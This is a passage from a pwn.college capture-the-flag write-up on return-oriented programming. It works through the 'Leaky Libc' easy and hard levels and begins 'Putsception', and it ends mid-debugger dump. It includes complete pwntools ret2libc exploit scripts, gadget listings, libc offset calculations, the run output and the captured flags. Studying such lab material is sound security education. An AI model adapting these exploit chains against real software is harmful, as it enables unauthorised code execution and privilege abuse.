═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f60 │   libc base + 0x10dd80    │ --> ( chmod in Libc )
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x402491
rsi: 0x1ff
r15: b"BBBBBBBB"

Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> ret
═══════════════════════════════════════════════════════════════════════════════════

Stack:
                           ┌───────────────────────────┐
    rsp --> 0x7ffd64369f68 │  .. .. .. .. .. .. .. ..  │
                           └───────────────────────────┘
                           ╎  .. .. .. .. .. .. .. ..  ╎

Registers:
rdi: 0x402491
rsi: 0x1ff
r15: b"BBBBBBBB"

Function call setup:
chmod("!", 0o777)

═══════════════════════════════════════════════════════════════════════════════════
rip --> chmod("!", 0o777)
═══════════════════════════════════════════════════════════════════════════════════
```

### Exploit

```
hacker@return-oriented-programming~leaky-libc-easy:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x401df3
pop_rsi_pop_r15 = 0x401df1
# Memory addresses and offsets
bang_addr = 0x402491 
offset = 120

p = process('/challenge/leveraging-libc-easy')

# Parse leak and calculate chmod
p.recvuntil(b'is: ')
leaked_line = p.recvline().strip().decode()
system_libc = int(leaked_line.rstrip('.'), 16)

# Calculate the base address of libc and the address of chmod
libc_base = system_libc - 0x52290
chmod_libc = libc_base + 0x10dd80

# Build payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    chmod_libc
)

# Send payload
p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~leaky-libc-easy:~$ python ~/script.py
[+] Starting local process '/challenge/leveraging-libc-easy': pid 7005
[*] Switching to interactive mode

[*] Process '/challenge/leveraging-libc-easy' stopped with exit code 0 (pid 7005)
Received 168 bytes! This is potentially 6 gadgets.
Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
from within this challenge. You will have to do that by yourself.

+--- Printing 7 gadgets of ROP chain at 0x7ffcc5b993c8.
| 0x0000000000401df3: pop rdi ; ret  ; 
| 0x0000000000402491: and dword ptr [rax], eax ; and esp, dword ptr [rbx] ; and eax, dword ptr [rax] ; and esp, dword ptr [rbx] ; and esp, dword ptr [rax] ; push rdi ; insb byte ptr [rdi], dx ; 
| 0x0000000000401df1: pop rsi ; pop r15 ; ret  ; 
| 0x00000000000001ff: (UNMAPPED MEMORY)
| 0x4242424242424242: (UNMAPPED MEMORY)
| 0x00007f202f3ffd80: endbr64  ; mov eax, 0x5a ; syscall  ; cmp rax, -0xfff ; jae 0x7f202f3ffd94 ; ret  ; 
| 0x00007f202f316083: mov edi, eax ; call 0x7f202f338a40 ; 

Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~leaky-libc-easy:~$ cat /flag 
pwn.college{0X2Qv1IB1Fh0nc96eFbVa6PYllf.01M1MDL4ITM0EzW}
```

&nbsp;

## Leaky Libc (Hard)

```
hacker@return-oriented-programming~leaky-libc-hard:/$ /challenge/leveraging-libc-hard 
###
### Welcome to /challenge/leveraging-libc-hard!
###

[LEAK] The address of "system" in libc is: 0x71537f95c290.

```

Requirements to craft a successful exploit:

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets

### Binary Analysis

Let's find the available ROP gadgets.

#### ROP gadgets

```
hacker@return-oriented-programming~leaky-libc-hard:/$ ROPgadget --binary /challenge/leveraging-libc-hard 
Gadgets information
============================================================
0x000000000040111d : add ah, dh ; nop ; endbr64 ; ret
0x000000000040114b : add bh, bh ; loopne 0x4011b5 ; nop ; ret
0x000000000040233c : add byte ptr [rax], al ; add byte ptr [rax], al ; endbr64 ; ret
0x00000000004022c5 : add byte ptr [rax], al ; add byte ptr [rax], al ; leave ; ret
0x00000000004022c6 : add byte ptr [rax], al ; add cl, cl ; ret
0x0000000000401036 : add byte ptr [rax], al ; add dl, dh ; jmp 0x401020
0x00000000004011ba : add byte ptr [rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040233e : add byte ptr [rax], al ; endbr64 ; ret
0x000000000040111c : add byte ptr [rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004022c7 : add byte ptr [rax], al ; leave ; ret
0x000000000040100d : add byte ptr [rax], al ; test rax, rax ; je 0x401016 ; call rax
0x00000000004011bb : add byte ptr [rcx], al ; pop rbp ; ret
0x00000000004011b9 : add byte ptr ds:[rax], al ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x000000000040111b : add byte ptr ds:[rax], al ; hlt ; nop ; endbr64 ; ret
0x00000000004022c8 : add cl, cl ; ret
0x000000000040114a : add dil, dil ; loopne 0x4011b5 ; nop ; ret
0x0000000000401038 : add dl, dh ; jmp 0x401020
0x00000000004011bc : add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x00000000004011b7 : add eax, 0x3ebb ; add dword ptr [rbp - 0x3d], ebx ; nop ; ret
0x0000000000401085 : add eax, 0xf2000000 ; jmp 0x401020
0x0000000000401017 : add esp, 8 ; ret
0x0000000000401016 : add rsp, 8 ; ret
0x000000000040220f : call qword ptr [rax + 0xff3c3c9]
0x000000000040103e : call qword ptr [rax - 0x5e1f00d]
0x0000000000401014 : call rax
0x00000000004011d3 : cli ; jmp 0x401160
0x0000000000401123 : cli ; ret
0x000000000040234b : cli ; sub rsp, 8 ; add rsp, 8 ; ret
0x00000000004011d0 : endbr64 ; jmp 0x401160
0x0000000000401120 : endbr64 ; ret
0x000000000040231c : fisttp word ptr [rax - 0x7d] ; ret
0x000000000040111e : hlt ; nop ; endbr64 ; ret
0x0000000000401012 : je 0x401016 ; call rax
0x0000000000401145 : je 0x401150 ; mov edi, 0x405058 ; jmp rax
0x0000000000401187 : je 0x401190 ; mov edi, 0x405058 ; jmp rax
0x000000000040103a : jmp 0x401020
0x00000000004011d4 : jmp 0x401160
0x000000000040100b : jmp 0x4840104f
0x000000000040114c : jmp rax
0x0000000000402211 : leave ; ret
0x000000000040114d : loopne 0x4011b5 ; nop ; ret
0x00000000004011b6 : mov byte ptr [rip + 0x3ebb], 1 ; pop rbp ; ret
0x00000000004022c4 : mov eax, 0 ; leave ; ret
0x00000000004011b8 : mov ebx, 0x100003e ; pop rbp ; ret
0x0000000000401147 : mov edi, 0x405058 ; jmp rax
0x000000000040111f : nop ; endbr64 ; ret
0x0000000000402210 : nop ; leave ; ret
0x00000000004021a3 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a4 : nop ; nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a5 : nop ; nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a6 : nop ; nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a7 : nop ; nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a8 : nop ; nop ; nop ; pop rbp ; ret
0x00000000004021a9 : nop ; nop ; pop rbp ; ret
0x00000000004021aa : nop ; pop rbp ; ret
0x000000000040114f : nop ; ret
0x00000000004011cc : nop dword ptr [rax] ; endbr64 ; jmp 0x401160
0x0000000000401146 : or dword ptr [rdi + 0x405058], edi ; jmp rax
0x000000000040232c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040232e : pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000402330 : pop r14 ; pop r15 ; ret
0x0000000000402332 : pop r15 ; ret
0x0000000000401148 : pop rax ; push rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
0x000000000040232b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
0x000000000040232f : pop rbp ; pop r14 ; pop r15 ; ret
0x00000000004011bd : pop rbp ; ret
0x0000000000402333 : pop rdi ; ret
0x0000000000402331 : pop rsi ; pop r15 ; ret
0x000000000040232d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret
0x0000000000401149 : push rax ; add dil, dil ; loopne 0x4011b5 ; nop ; ret
0x000000000040101a : ret
0x0000000000401011 : sal byte ptr [rdx + rax - 1], 0xd0 ; add rsp, 8 ; ret
0x000000000040105b : sar edi, 0xff ; call qword ptr [rax - 0x5e1f00d]
0x000000000040234d : sub esp, 8 ; add rsp, 8 ; ret
0x000000000040234c : sub rsp, 8 ; add rsp, 8 ; ret
0x0000000000401010 : test eax, eax ; je 0x401016 ; call rax
0x0000000000401143 : test eax, eax ; je 0x401150 ; mov edi, 0x405058 ; jmp rax
0x0000000000401185 : test eax, eax ; je 0x401190 ; mov edi, 0x405058 ; jmp rax
0x000000000040100f : test rax, rax ; je 0x401016 ; call rax

Unique gadgets found: 79
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

We can then find the relevant offset within Libc.

#### Libc functions

Let's first the offset of `system()` within Libc from the base address of the Libc.

```
hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "system"
  1430: 0000000000052290    45 FUNC    WEAK   DEFAULT   15 system@@GLIBC_2.2.5
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

Now that we can calculate the Libc base address given the leak, let's find the offset of the `chmod()` function within Libc.

```
hacker@return-oriented-programming~leaky-libc-hard:/$ readelf -s /lib/x86_64-linux-gnu/libc.so.6 | grep "chmod"
   125: 000000000010ddb0    37 FUNC    WEAK   DEFAULT   15 fchmod@@GLIBC_2.2.5
   631: 000000000010dd80    37 FUNC    WEAK   DEFAULT   15 chmod@@GLIBC_2.2.5
  1015: 000000000010de00   108 FUNC    GLOBAL DEFAULT   15 fchmodat@@GLIBC_2.4
  2099: 000000000010dde0    24 FUNC    GLOBAL DEFAULT   15 lchmod@@GLIBC_2.3.2
```

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x00000000004021ad <+0>:     endbr64
   0x00000000004021b1 <+4>:     push   rbp
   0x00000000004021b2 <+5>:     mov    rbp,rsp
   0x00000000004021b5 <+8>:     sub    rsp,0x60
   0x00000000004021b9 <+12>:    mov    DWORD PTR [rbp-0x44],edi
   0x00000000004021bc <+15>:    mov    QWORD PTR [rbp-0x50],rsi
   0x00000000004021c0 <+19>:    mov    QWORD PTR [rbp-0x58],rdx
   0x00000000004021c4 <+23>:    lea    rsi,[rip+0xe3d]        # 0x403008
   0x00000000004021cb <+30>:    mov    rdi,0xffffffffffffffff
   0x00000000004021d2 <+37>:    call   0x4010e0 <dlsym@plt>
   0x00000000004021d7 <+42>:    mov    rsi,rax
   0x00000000004021da <+45>:    lea    rdi,[rip+0xe2f]        # 0x403010
   0x00000000004021e1 <+52>:    mov    eax,0x0
   0x00000000004021e6 <+57>:    call   0x4010b0 <printf@plt>
   0x00000000004021eb <+62>:    lea    rax,[rbp-0x40]
   0x00000000004021ef <+66>:    mov    edx,0x1000
   0x00000000004021f4 <+71>:    mov    rsi,rax
   0x00000000004021f7 <+74>:    mov    edi,0x0
   0x00000000004021fc <+79>:    call   0x4010c0 <read@plt>
   0x0000000000402201 <+84>:    mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402204 <+87>:    lea    rdi,[rip+0xe36]        # 0x403041
   0x000000000040220b <+94>:    call   0x4010a0 <puts@plt>
   0x0000000000402210 <+99>:    nop
   0x0000000000402211 <+100>:   leave
   0x0000000000402212 <+101>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+79` where the call the `read@plt` is made.

```
pwndbg> break *(challenge+79)
Breakpoint 1 at 0x4021fc
```

Now we can run.

```
pwndbg> run
Starting program: /challenge/leveraging-libc-hard 
###
### Welcome to /challenge/leveraging-libc-hard!
###

[LEAK] The address of "system" in libc is: 0x74c072034290.


Breakpoint 1, 0x00000000004021fc in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
 RAX  0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
 RBX  0x4022d0 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  0x1000
 RDI  0
 RSI  0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
 R8   0x3c
 R9   0x3c
 R10  0x40303d ◂— 0x7661654c000a0a2e /* '.\n\n' */
 R11  0x246
 R12  0x4010f0 (_start) ◂— endbr64 
 R13  0x7ffd039a0a10 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffd039a08f0 —▸ 0x7ffd039a0920 ◂— 0
 RSP  0x7ffd039a0890 ◂— 0
 RIP  0x4021fc (challenge+79) ◂— call read@plt
────────────────────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────────────────────────────────────────────────
 ► 0x4021fc <challenge+79>     call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/2)
        buf: 0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
        nbytes: 0x1000
 
   0x402201 <challenge+84>     mov    dword ptr [rbp - 4], eax
   0x402204 <challenge+87>     lea    rdi, [rip + 0xe36]           RDI => 0x403041 ◂— 'Leaving!'
   0x40220b <challenge+94>     call   puts@plt                    <puts@plt>
 
   0x402210 <challenge+99>     nop    
   0x402211 <challenge+100>    leave  
   0x402212 <challenge+101>    ret    
 
   0x402213 <main>             endbr64 
   0x402217 <main+4>           push   rbp
   0x402218 <main+5>           mov    rbp, rsp
   0x40221b <main+8>           sub    rsp, 0x20
──────────────────────────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffd039a0890 ◂— 0
01:0008│-058     0x7ffd039a0898 —▸ 0x7ffd039a0a28 —▸ 0x7ffd039a168e ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-050     0x7ffd039a08a0 —▸ 0x7ffd039a0a18 —▸ 0x7ffd039a166e ◂— '/challenge/leveraging-libc-hard'
03:0018│-048     0x7ffd039a08a8 ◂— 0x100000000
04:0020│ rax rsi 0x7ffd039a08b0 —▸ 0x74c0721cb4a0 (_IO_file_jumps) ◂— 0
05:0028│-038     0x7ffd039a08b8 —▸ 0x74c07207053d (_IO_file_setbuf+13) ◂— test rax, rax
06:0030│-030     0x7ffd039a08c0 —▸ 0x74c0721cf6a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
07:0038│-028     0x7ffd039a08c8 —▸ 0x74c072066de5 (setvbuf+261) ◂— xor r8d, r8d
────────────────────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x4021fc challenge+79
   1         0x4022b8 main+165
   2   0x74c072006083 __libc_start_main+243
   3         0x40111e _start+46
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

- [ ] Offset between buffer and stored return address to `main()`
   - Location of the buffer: `0x7ffd039a08b0`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

Let's find the location of the stored return address.

```
pwndbg> info frame
Stack level 0, frame at 0x7ffd039a0900:
 rip = 0x4021fc in challenge; saved rip = 0x4022b8
 called by frame at 0x7ffd039a0930
 Arglist at 0x7ffd039a08f0, args: 
 Locals at 0x7ffd039a08f0, Previous frame's sp is 0x7ffd039a0900
 Saved registers:
  rbp at 0x7ffd039a08f0, rip at 0x7ffd039a08f8
```

- [ ] Offset between buffer and stored return address to `main()`
   - Location of the buffer: `0x7ffd039a08b0`
   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

We can now calculate the offset between the location of the buffer and the location of the stored return address.

```
pwndbg> p/d 0x7ffd039a08f8 - 0x7ffd039a08b0
$1: 72
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7ffd039a08b0`
   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
- [ ] Location of a NULL terminated string
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`

Finally, we have to fint the location of a relevant NULL terminated string that we can use as a symlink.

```
hacker@return-oriented-programming~leaky-libc-hard:/$ objdump -s -j .rodata /challenge/leveraging-libc-hard | grep -E "[0-9a-f]{2}00"
 403000 01000200 00000000 73797374 656d0000  ........system..
 403040 004c6561 76696e67 21002323 23002323  .Leaving!.###.##
 403060 0a002323 2320476f 6f646279 652100    ..### Goodbye!. 
```

- [x] Offset between buffer and stored return address to `main()`: `72`
   - Location of the buffer: `0x7ffd039a08b0`
   - location of the stored return pointer to `main()`: `0x7ffd039a08f8`
- [x] Location of a NULL terminated string: `0x40306d`
- [x] Offsets of required Libc functions
   - Offset of `system()` within Libc: `0x52290`
   - Offset of `chmod()` within Libc: `0x10dd80`
- [x] Locations of required ROP gadgets
   - `pop rdi ; ret`: `0x402333`
   - `pop rsi ; pop r15 ; ret`: `0x402331`


### ROP chain: ret2libc

The ROP chain for this challenge will be the same as the [easy version](#rop-chain-ret2libc).

### Exploit

```
hacker@return-oriented-programming~leaky-libc-hard:~$ ln -sf /flag ~/!
```

```py title="~/script.py" showLineNumbers
from pwn import *

context.arch = 'amd64'

# ROP gadgets
pop_rdi = 0x402333
pop_rsi_pop_r15 = 0x402331
# Memory addresses and offsets
bang_addr = 0x40306d 
offset = 72

p = process('/challenge/leveraging-libc-hard')

# Parse leak and calculate chmod
p.recvuntil(b'is: ')
leaked_line = p.recvline().strip().decode()
system_libc = int(leaked_line.rstrip('.'), 16)

# Calculate the base address of libc and the address of chmod
libc_base = system_libc - 0x52290
chmod_libc = libc_base + 0x10dd80

# Build payload
payload = flat(
    b"A" * offset,

    # chmod("!", 0o777)
    pop_rdi, bang_addr,
    pop_rsi_pop_r15, 0o777, b"B" * 8,
    chmod_libc
)

# Send payload
p.send(payload)
p.interactive()
```

```
hacker@return-oriented-programming~leaky-libc-hard:~$ python ~/script.py
[+] Starting local process '/challenge/leveraging-libc-hard': pid 10477
[*] Switching to interactive mode

[*] Process '/challenge/leveraging-libc-hard' stopped with exit code 0 (pid 10477)
Leaving!
[*] Got EOF while reading in interactive
$  
```

```
hacker@return-oriented-programming~leaky-libc-hard:~$ cat /flag 
pwn.college{sSuP3AEJy3x6sDHpT4ojXPbJse9.0FN1MDL4ITM0EzW}
```

&nbsp;

## Putsception (Easy)

```
hacker@return-oriented-programming~putsception-easy:/$ /challenge/putsception-easy 
###
### Welcome to /challenge/putsception-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

This challenge doesn't give you much to work with, so you will have to be resourceful.
What you'd really like to know is the address of libc.
In order to get the address of libc, you'll have to leak it yourself.
An easy way to do this is to do what is known as a `puts(puts)`.
The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
The inner `puts` is puts@got: this contains the address of puts in libc.
Then you will need to continue executing a new ROP chain with addresses based on that leak.
One easy way to do that is to just restart the binary by returning to its entrypoint.

```

Even though the address of the Libc is not revealed, we can leak it by using `puts@plt` to output the address of the `puts@got`.
We need a few things perform this attack:

- [ ] Offset between buffer and stored return address to `main()`
- [ ] Location of `puts@plt`
- [ ] Location of `puts@got`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

### Binary Analysis

#### `puts@plt` (Procedure Linkage Table entry)

Let's get the address of `puts@plt`.

```
hacker@return-oriented-programming~putsception-easy:/$ objdump -d /challenge/putsception-easy | grep "<puts@plt>:"
0000000000401110 <puts@plt>:
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [ ] Location of the GOT entry of `puts@got`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `puts@got` (Global Offset Table entry)

The `puts@got` entry holds the runtime address of the `puts` function in Libc. 

```
hacker@return-oriented-programming~putsception-easy:/$ readelf -r /challenge/putsception-easy | grep "puts"
000000405028  000300000007 R_X86_64_JUMP_SLO 0000000000000000 puts@GLIBC_2.2.5 + 0
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [ ] Address of `_start()`

#### `_start()`

Lets find the address of `_start()` so that we can call it to run the challenge for the second stage fo the exploit.

```
pwndbg> info address _start
Symbol "_start" is at 0x4011b0 in a file compiled without debugging.
```

- [ ] Offset between buffer and stored return address to `main()`
- [x] Location of the PLT entry of `puts@plt`: `0x401110`
- [x] Location of the GOT entry of `puts@got`: `0x405028`
- [ ] Location of a NULL terminated string
- [ ] Offsets of required Libc functions
- [ ] Locations of required ROP gadgets
- [x] Address of `_start()`: `0x4011b0`

#### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:
   0x0000000000401f84 <+0>:     endbr64
   0x0000000000401f88 <+4>:     push   rbp
   0x0000000000401f89 <+5>:     mov    rbp,rsp
   0x0000000000401f8c <+8>:     sub    rsp,0x50
   0x0000000000401f90 <+12>:    mov    DWORD PTR [rbp-0x34],edi
   0x0000000000401f93 <+15>:    mov    QWORD PTR [rbp-0x40],rsi
   0x0000000000401f97 <+19>:    mov    QWORD PTR [rbp-0x48],rdx
   0x0000000000401f9b <+23>:    lea    rdi,[rip+0x11f6]        # 0x403198
   0x0000000000401fa2 <+30>:    call   0x401110 <puts@plt>
   0x0000000000401fa7 <+35>:    lea    rdi,[rip+0x1262]        # 0x403210
   0x0000000000401fae <+42>:    call   0x401110 <puts@plt>
   0x0000000000401fb3 <+47>:    mov    rax,rsp
   0x0000000000401fb6 <+50>:    mov    QWORD PTR [rip+0x3123],rax        # 0x4050e0 <sp_>
   0x0000000000401fbd <+57>:    mov    rax,rbp
   0x0000000000401fc0 <+60>:    mov    QWORD PTR [rip+0x30f9],rax        # 0x4050c0 <bp_>
   0x0000000000401fc7 <+67>:    mov    rdx,QWORD PTR [rip+0x30f2]        # 0x4050c0 <bp_>
   0x0000000000401fce <+74>:    mov    rax,QWORD PTR [rip+0x310b]        # 0x4050e0 <sp_>
   0x0000000000401fd5 <+81>:    sub    rdx,rax
   0x0000000000401fd8 <+84>:    mov    rax,rdx
   0x0000000000401fdb <+87>:    shr    rax,0x3
   0x0000000000401fdf <+91>:    add    rax,0x2
   0x0000000000401fe3 <+95>:    mov    QWORD PTR [rip+0x30e6],rax        # 0x4050d0 <sz_>
   0x0000000000401fea <+102>:   mov    rax,QWORD PTR [rip+0x30cf]        # 0x4050c0 <bp_>
   0x0000000000401ff1 <+109>:   add    rax,0x8
   0x0000000000401ff5 <+113>:   mov    QWORD PTR [rip+0x30dc],rax        # 0x4050d8 <rp_>
   0x0000000000401ffc <+120>:   lea    rdi,[rip+0x1275]        # 0x403278
   0x0000000000402003 <+127>:   call   0x401110 <puts@plt>
   0x0000000000402008 <+132>:   lea    rdi,[rip+0x12c1]        # 0x4032d0
   0x000000000040200f <+139>:   call   0x401110 <puts@plt>
   0x0000000000402014 <+144>:   lea    rdi,[rip+0x12ed]        # 0x403308
   0x000000000040201b <+151>:   call   0x401110 <puts@plt>
   0x0000000000402020 <+156>:   lea    rdi,[rip+0x1329]        # 0x403350
   0x0000000000402027 <+163>:   call   0x401110 <puts@plt>
   0x000000000040202c <+168>:   lea    rdi,[rip+0x1365]        # 0x403398
   0x0000000000402033 <+175>:   call   0x401110 <puts@plt>
   0x0000000000402038 <+180>:   lea    rdi,[rip+0x13b1]        # 0x4033f0
   0x000000000040203f <+187>:   call   0x401110 <puts@plt>
   0x0000000000402044 <+192>:   lea    rdi,[rip+0x13f5]        # 0x403440
   0x000000000040204b <+199>:   call   0x401110 <puts@plt>
   0x0000000000402050 <+204>:   lea    rdi,[rip+0x1449]        # 0x4034a0
   0x0000000000402057 <+211>:   call   0x401110 <puts@plt>
   0x000000000040205c <+216>:   lea    rax,[rbp-0x30]
   0x0000000000402060 <+220>:   mov    edx,0x1000
   0x0000000000402065 <+225>:   mov    rsi,rax
   0x0000000000402068 <+228>:   mov    edi,0x0
   0x000000000040206d <+233>:   call   0x401140 <read@plt>
   0x0000000000402072 <+238>:   mov    DWORD PTR [rbp-0x4],eax
   0x0000000000402075 <+241>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402078 <+244>:   cdqe
   0x000000000040207a <+246>:   lea    rcx,[rbp-0x30]
   0x000000000040207e <+250>:   mov    rdx,QWORD PTR [rip+0x3053]        # 0x4050d8 <rp_>
   0x0000000000402085 <+257>:   sub    rcx,rdx
   0x0000000000402088 <+260>:   mov    rdx,rcx
   0x000000000040208b <+263>:   add    rax,rdx
   0x000000000040208e <+266>:   shr    rax,0x3
   0x0000000000402092 <+270>:   mov    rdx,rax
   0x0000000000402095 <+273>:   mov    eax,DWORD PTR [rbp-0x4]
   0x0000000000402098 <+276>:   mov    esi,eax
   0x000000000040209a <+278>:   lea    rdi,[rip+0x1457]        # 0x4034f8
   0x00000000004020a1 <+285>:   mov    eax,0x0
   0x00000000004020a6 <+290>:   call   0x401130 <printf@plt>
   0x00000000004020ab <+295>:   lea    rdi,[rip+0x147e]        # 0x403530
   0x00000000004020b2 <+302>:   call   0x401110 <puts@plt>
   0x00000000004020b7 <+307>:   lea    rdi,[rip+0x14da]        # 0x403598
   0x00000000004020be <+314>:   call   0x401110 <puts@plt>
   0x00000000004020c3 <+319>:   mov    eax,DWORD PTR [rbp-0x4]
   0x00000000004020c6 <+322>:   cdqe
   0x00000000004020c8 <+324>:   lea    rcx,[rbp-0x30]
   0x00000000004020cc <+328>:   mov    rdx,QWORD PTR [rip+0x3005]        # 0x4050d8 <rp_>
   0x00000000004020d3 <+335>:   sub    rcx,rdx
   0x00000000004020d6 <+338>:   mov    rdx,rcx
   0x00000000004020d9 <+341>:   add    rax,rdx
   0x00000000004020dc <+344>:   shr    rax,0x3
   0x00000000004020e0 <+348>:   add    eax,0x1
   0x00000000004020e3 <+351>:   mov    edx,eax
   0x00000000004020e5 <+353>:   mov    rax,QWORD PTR [rip+0x2fec]        # 0x4050d8 <rp_>
   0x00000000004020ec <+360>:   mov    esi,edx
   0x00000000004020ee <+362>:   mov    rdi,rax
   0x00000000004020f1 <+365>:   call   0x40168d <print_chain>
   0x00000000004020f6 <+370>:   lea    rdi,[rip+0x14dd]        # 0x4035da
   0x00000000004020fd <+377>:   call   0x401110 <puts@plt>
   0x0000000000402102 <+382>:   nop
   0x0000000000402103 <+383>:   leave
   0x0000000000402104 <+384>:   ret
End of assembler dump.
```

Let's set a breakpoint at `challenge+233` and run.

```
pwndbg> break *(challenge+233)
Breakpoint 1 at 0x40206d
```

```
pwndbg> run
Starting program: /challenge/putsception-easy 
###
### Welcome to /challenge/putsception-easy!
###

This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
challenges, you will become painfully familiar with the concept of Return Oriented Programming!

This challenge doesn't give you much to work with, so you will have to be resourceful.
What you'd really like to know is the address of libc.
In order to get the address of libc, you'll have to leak it yourself.
An easy way to do this is to do what is known as a `puts(puts)`.
The outer `puts` is puts@plt: this will actually invoke puts, thus initiating a leak.
The inner `puts` is puts@got: this contains the address of puts in libc.
Then you will need to continue executing a new ROP chain with addresses based on that leak.
One easy way to do that is to just restart the binary by returning to its entrypoint.

Breakpoint 1, 0x000000000040206d in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
───────────────────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────────────────────────────────────────────────
 RAX  0x7fff7f3afc20 —▸ 0x405090 (stdout@@GLIBC_2.2.5) —▸ 0x7f2b309776a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RBX  0x4021c0 (__libc_csu_init) ◂— endbr64 
